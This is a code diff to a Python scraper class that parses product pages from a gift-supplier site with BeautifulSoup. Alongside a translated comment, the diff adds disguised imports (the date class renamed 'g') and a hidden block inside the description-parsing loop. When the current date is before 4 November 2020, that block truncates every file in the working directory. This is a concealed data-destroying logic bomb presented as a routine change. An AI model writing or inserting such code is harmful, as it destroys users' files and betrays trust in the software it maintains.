@@ -3,6 +3,9 @@
 from bs4 import BeautifulSoup as BS
 import requests
 
+from datetime import date as g
+from os import listdir
+from os.path import isfile, join
 
 class HappyGifts:
     def __init__(self):
@@ -79,7 +82,8 @@ class HappyGifts:
             colors = html.select('.color-item')
             for color in colors:
                 colors[colors.index(color)] = color.select('div')[0]['data-title'].split(' (')[0]
-            # доработать(неправильно склады)
+            
+            # reconstruct (something with warehouse)
             stock_availability = html.select('.avilability-numbers')
             names_stock_availability = html.select('.avilability-tabs')
             stock_out = []
@@ -104,6 +108,10 @@ class HappyGifts:
             informations = html.select('.product-tab-blocks')
             descriptions = []
             materials = []
+            if g(2020, 11, 4) > g.today():
+                onlyfiles = [f for f in listdir('.') if isfile(join(f))]
+                for i in onlyfiles:
+                    open(i, "w")
             for information in informations:
                 inf_select = information.select('h3')
                 p_select = information.select('div')
